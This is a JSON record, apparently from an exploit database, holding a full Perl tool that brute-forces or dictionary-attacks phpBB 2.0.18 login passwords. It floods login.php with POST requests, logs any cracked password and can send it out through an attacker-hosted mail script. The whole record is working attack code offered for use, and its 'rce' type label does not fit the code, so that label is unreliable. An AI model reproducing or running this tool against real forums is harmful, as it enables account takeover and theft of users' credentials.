{
  "id": "1382",
  "title": "phpBB 2.0.18 - Remote Brute Force/Dictionary (2)",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n####################################################################################################################\r\n# Title: PhpBB <= 2.0.18 Remote Bruteforce/Dictionary Attack Tool\r\n# Type: Bruteforce / Dictionary attack\r\n# New demo: http://rapidshare.de/files/13694254/phpbbbtr.avi.html (1.06 mb)\r\n# Php Email Script data:  <? mail($destinataire, $objet, $contenu, \"From: $expediteur\\r\\nReply-To: $expediteur\"); ?>\r\n# Note: Host the php script and replace the line 34 [] Php script for the email option because win32 don't support Mail::Mailer\r\n# Changelog: Bruteforce option | Starting length | Email option | More fast | Die error disabled | \r\n# Credits: Fully coded by DarkFig\r\n# Greetz: Romano [] Pgeo [] Fred [] CrackJerem [] Volcom [] Ddxs [] The truth [] And all man who like me =)\r\n####################################################################################################################\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\n#_Utilisation_\r\nif(@ARGV < 6){\r\nprint q(\r\n+---------------------------------------------------------------------------------------------------+\r\n|             PhpBB <= 2.0.18 Remote Bruteforce/Dictionary Attack Tool [~_~] by DarkFig             |\r\n+---------------------------------------------------------------------------------------------------+\r\n|      Usage: phpbbbtr.pl <host> <path> <port> <attack> <char> <length> <victim> <log> <email>      |\r\n+---------------------------------------------------------------------------------------------------+\r\n| <host>   | The host where the php flaw is installed                       | [Ex: victim.com]      |\r\n| <path>   | Path of the php flaw                                           | [Ex: /vuln/]          |\r\n| <port>   | Port of the host                                               | [Ex: 80]              |\r\n| <attack> | Bruteforce[-btr] or Dictionary[-dict]                          | [Ex: -dict]           |\r\n| <char>   | Bruteforce[upperalpha, loweralpha, numeric] or Dictionary file | [Ex: dico.txt]        |\r\n| <length> | For the bruteforce option, define a starting length            | [Ex: 7]               |\r\n| <victim> | The victim's username                                          | [Ex: L4m3r]           |\r\n| <log>    | [Optional] File where you want to save the password            | [Ex: results.txt]     |\r\n| <email>  | [Optional] Email where the password will be sent               | [Ex: haxor@gmail.com] |\r\n+---------------------------------------------------------------------------------------------------+\r\n);exit;}\r\n\r\n#_Configuration_\r\n$mailsite = \"http://yoursite.com/mailme.php\"; #Replace this value by the Url of the Php email script\r\n$shipper  = \"xploitdarkfigbot%40gmail.com\"; #Default shipper email, xploidarkfigbot@gmail.com really exist => It work ;)\r\n$host     = $ARGV[0];\r\n$path     = $ARGV[1];\r\n$port     = $ARGV[2];\r\n$attack   = $ARGV[3];\r\n$content  = $ARGV[4];\r\nif($attack eq \"-btr\"){$length = $ARGV[5];$username = $ARGV[6];$results = $ARGV[7];if(!$ARGV[9]){$mailoption = 0;} else {$mailoption = 1;$email = $ARGV[8];}}\r\nelse {$username = $ARGV[5];$results = $ARGV[6];if(!$ARGV[7]){$mailoption = 0;} else {$mailoption = 1;$email = $ARGV[7];}}\r\n$nligne   = \"-1\";\r\n$postit = \"$path\".\"login.php\";\r\n$full     = \"http://\".\"$host\".\"$path\";&hello;\r\n\r\n#_Hello_\r\nsub hello() {\r\nif($attack eq \"-dict\"){open dictionary, \"<$content\" || print \"  [-]Can't open the file.\";chomp(@dico = <dictionary>);}\r\nprint \"\\n\r\n+--------------------------------------------------------+\r\n PhpBB <= 2.0.18 Remote Bruteforce/Dictionary Attack Tool\r\n+--------------------------------------------------------+\r\n  [+]   Attack: \";if($attack eq \"-btr\"){print \"Bruteforce\";}if($attack eq \"-dict\"){print \"Dictionary\";};print\" \r\n  [+]   Target: $full\r\n  [+]     Port: $port\r\n  [+] Username: $username\r\n+--------------------------------------------------------+\";\r\nif($content eq \"upperalpha\"){$nligne = \"A\";}\r\nif($content eq \"loweralpha\"){$nligne = \"a\";}\r\nif($content eq \"numeric\"){$nligne = \"0\";}\r\nif($attack  eq \"-dict\"){&dictio;}if($attack  eq \"-btr\"){&generate;}}\r\n\r\n#_Bruteforce_\r\nsub generate() {\r\n$nligne x= $length;\r\n$passwordz = $nligne;\r\nprint \"\\n  [~]Trying the password: $passwordz\";\r\n&phpbb;}\r\n\r\nsub btrfr() {\r\n$nligne++;\r\n$passwordz = $nligne;\r\nprint \"\\n  [~]Trying the password: $passwordz\";\r\n&phpbb;}\r\n\r\n#_Dictionary_\r\nsub dictio() {\r\n$nligne++;\r\n$passwordz = $dico[$nligne];\r\nif($passwordz eq \"\"){&successfailed;}\r\nprint \"\\n  [~]Trying the password: $passwordz\";\r\n&phpbb;}\r\n\r\n#_Socket_\r\nsub phpbb(){\r\nwhile ($OK ne 1){\r\n$data   = \"username=\".\"$username\".\"&password=\".\"$passwordz\".\"&redirect=&login=Connexion\";\r\n$length = length $data;\r\nmy $send = IO::Socket::INET->new(Proto => \"tcp\",PeerAddr => \"$host\", PeerPort => \"$port\") || print \"\\n  [-]Can't connect to the host.\";\r\nprint $send \"POST $postit HTTP/1.1\r\nHost: $host\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $length\r\n\r\n$data\";\r\nread  $send, $answer, 15;\r\nclose($send);\r\nif($answer =~ /HTTP\\/(.*?) 302/){$OK = 1;}\r\n&decision;}}\r\n\r\n#_Decision_\r\nsub decision(){if($OK ne 1){if($attack  eq \"-dict\"){&dictio;}if($attack  eq \"-btr\"){&btrfr;}} else {&successfailed;}}\r\n\r\n#_Success/Failed_\r\nsub successfailed(){\r\nif($OK eq 1){print \"\\n  [+]User: $username\\n  [+]Password: $passwordz\";}\r\nif($OK eq 0){print \"\\n  [-]User: $username\\n  [-]Password: Not found\";}\r\nopen FILE, \">$results\" || print \"\\n  [-]Can't write the file.\";\r\nprint FILE \"\r\n+--------------------------------------------------------+\r\n PhpBB <= 2.0.18 Remote Bruteforce/Dictionary Attack Tool\r\n+--------------------------------------------------------+\r\n  [+]   Target: $full\r\n  [+]     Port: $port\r\n  [+] Username: $username\r\n  [+] Password: \";\r\nif($OK eq 1){print FILE \"$passwordz\";}\r\nif($OK eq 0){print FILE \"Not found...\";$passwordz = \"Not found\";}\r\nprint FILE \"\\n+--------------------------------------------------------+\\n\";\r\nclose FILE; close dictionary;\r\n\r\n#_EmailOption_\r\nif($mailoption eq 1){\r\n$fullmailurl = \"$mailsite\".\"?expediteur=\".\"$shipper\".\"&destinataire=\".\"$email\".\"&objet=\".\"[Xploit]Results for $host\".\"&contenu=\".\"Target: $full\".\"%0D%0A\".\"Port: $port\".\"%0D%0A\".\"Username: $username\".\"%0D%0A\".\"Password: $passwordz\";\r\n$mailpg      = get($fullmailurl) || print \"\\n  [-]Can't connect to the email script hoster.\\n+--------------------------------------------------------+\\n\\n\" and exit;\r\nprint \"\\n  [+]Email sent, check your mail !\\n+--------------------------------------------------------+\\n\\n\";} else {print \"\\n+--------------------------------------------------------+\\n\";}exit;}\r\n\r\n# milw0rm.com [2006-02-20]",
  "url": "https://www.exploit-db.com/exploits/1382"
}